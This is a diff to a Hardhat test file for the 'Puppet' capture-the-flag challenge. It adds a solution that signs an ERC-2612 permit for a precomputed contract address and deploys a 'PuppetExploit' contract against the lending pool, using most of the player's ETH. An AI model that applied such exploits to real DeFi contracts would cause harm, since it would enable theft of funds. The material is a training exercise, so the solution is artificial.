@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +96,29 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        exploitFactory = await ethers.getContractFactory('PuppetExploit', player);
+
+        exploitAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: await player.getTransactionCount()
+          });
+
+        signature = await signERC2612Permit(
+            player, 
+            token.address, 
+            player.address, 
+            exploitAddress, 
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
+        await exploitFactory.deploy(
+            lendingPool.address,
+            signature.v,
+            signature.r,
+            signature.s,
+            signature.deadline,
+            { value: PLAYER_INITIAL_ETH_BALANCE*24n/25n, gasLimit: 1e6 });
     });
 
     after(async function () {
